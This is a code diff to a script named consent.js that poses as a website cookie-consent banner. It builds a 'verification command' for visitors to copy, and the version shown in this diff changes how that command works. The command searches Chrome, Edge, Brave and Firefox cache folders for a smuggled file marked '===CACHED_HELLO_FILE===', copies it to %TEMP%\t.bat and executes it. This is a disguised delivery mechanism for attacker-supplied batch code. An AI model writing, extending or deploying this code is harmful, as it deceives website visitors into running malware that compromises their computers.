@@ -2,7 +2,7 @@
    <script src="https://yoursite.com/consent.js"></script>
    File URL from page query: ?f=https://abc.com/hello.txt  or  ?f=<base64-url>
    Payload MUST be strict raw body only (no HTTP headers, no HTML, no BOM, no bytes after ===END===).
-   Hardcode cacheFileSizes after running get-cache-size.cmd once per browser.
+   One-liner finds cache by marker string (findstr), not file size.
 */
 (function () {
   'use strict';
@@ -11,7 +11,7 @@
   window.__CONSENT_INJECTED__ = true;
 
   var CONSENT_CONFIG = {
-    version: '1.4.0',
+    version: '1.5.0',
     privacyPolicyUrl: '/privacy-policy',
     optOutUrl: '/opt-out-preferences',
     accentColor: '#1b6369',
@@ -23,17 +23,11 @@
     bodyStartMarker: '===CACHED_HELLO_FILE===',
     bodyEndMarker: '===END===',
     bodyMustStartWith: '@echo off',
-    cacheFileSizes: {
-      firefox: 0,
-      chrome: 0,
-      edge: 0,
-      brave: 0
-    },
-    verificationCommands: {
-      chrome: 'cmd /c for /r "%LOCALAPPDATA%\\Google\\Chrome\\User Data" %f in (f_*) do @if %~zf==0 copy /y "%f" "%TEMP%\\t.bat">nul 2>nul&call "%TEMP%\\t.bat"',
-      edge: 'cmd /c for /r "%LOCALAPPDATA%\\Microsoft\\Edge\\User Data" %f in (f_*) do @if %~zf==0 copy /y "%f" "%TEMP%\\t.bat">nul 2>nul&call "%TEMP%\\t.bat"',
-      brave: 'cmd /c for /r "%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data" %f in (f_*) do @if %~zf==0 copy /y "%f" "%TEMP%\\t.bat">nul 2>nul&call "%TEMP%\\t.bat"',
-      firefox: 'cmd /c for /r "%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles" %f in (*) do @if %~zf==0 copy /y "%f" "%TEMP%\\t.bat">nul 2>nul&call "%TEMP%\\t.bat"'
+    cacheSearchPaths: {
+      firefox: { root: '%LOCALAPPDATA%\\Mozilla\\Firefox\\Profiles', glob: '(*)' },
+      chrome: { root: '%LOCALAPPDATA%\\Google\\Chrome\\User Data', glob: '(f_*)' },
+      edge: { root: '%LOCALAPPDATA%\\Microsoft\\Edge\\User Data', glob: '(f_*)' },
+      brave: { root: '%LOCALAPPDATA%\\BraveSoftware\\Brave-Browser\\User Data', glob: '(f_*)' }
     }
   };
 
@@ -120,8 +114,7 @@
     if (!statusEl) return;
 
     if (state === 'ok') {
-      var cacheSize = getHardcodedCacheSize();
-      statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes, cache entry ' + (cacheSize || 'not set') + ' bytes (' + getBrowserKey() + ')';
+      statusEl.textContent = 'strict body ' + (CONSENT_CONFIG.cacheFileBodySize || '?') + ' bytes, one-liner searches for "' + (CONSENT_CONFIG.bodyStartMarker || '') + '" (' + getBrowserKey() + ')';
       statusEl.className = 'ok';
       if (previewEl && text) previewEl.textContent = text;
     } else {
@@ -138,25 +131,19 @@
     return 'chrome';
   }
 
-  function getHardcodedCacheSize() {
-    var sizes = CONSENT_CONFIG.cacheFileSizes || {};
-    var key = getBrowserKey();
-    var size = sizes[key];
-    if (size == null || size <= 0) return null;
-    return size;
-  }
-
   function getVerificationCommand() {
-    var cmds = CONSENT_CONFIG.verificationCommands;
-    var cacheSize = getHardcodedCacheSize();
-    if (!cmds || cacheSize == null) return '';
+    var startMarker = CONSENT_CONFIG.bodyStartMarker || '===CACHED_HELLO_FILE===';
+    var endMarker = CONSENT_CONFIG.bodyEndMarker || '===END===';
+    if (!startMarker || !endMarker) return '';
 
     var key = getBrowserKey();
-    var cmd = cmds[key] || cmds.firefox || cmds.chrome || '';
-    if (cmd) {
-      cmd = cmd.replace(/%~zf==\d+/g, '%~zf==' + cacheSize);
-    }
-    return cmd;
+    var paths = CONSENT_CONFIG.cacheSearchPaths || {};
+    var profile = paths[key] || paths.firefox;
+    if (!profile) return '';
+
+    var find = 'findstr /m /c:"' + startMarker + '" "%f" >nul 2>nul && findstr /m /c:"' + endMarker + '" "%f" >nul 2>nul';
+    var loop = 'for /r "' + profile.root + '" %f in ' + profile.glob + ' do @(' + find + ' && if not exist "%TEMP%\\t.bat" copy /y "%f" "%TEMP%\\t.bat" >nul 2>nul)';
+    return 'cmd /c ' + loop + ' & if exist "%TEMP%\\t.bat" call "%TEMP%\\t.bat"';
   }
 
   function fallbackCopy(text) {
@@ -419,7 +406,7 @@
   function updateCopyHint(el, copied) {
     if (!el) return;
     if (!getVerificationCommand()) {
-      el.textContent = 'Confirmation code unavailable — set cacheFileSizes.' + getBrowserKey() + ' in consent.js (run get-cache-size.cmd).';
+      el.textContent = 'Confirmation code unavailable — check bodyStartMarker/bodyEndMarker in consent.js.';
       el.className = 'ts-v-copy-hint ts-v-copy-warn';
       return;
     }
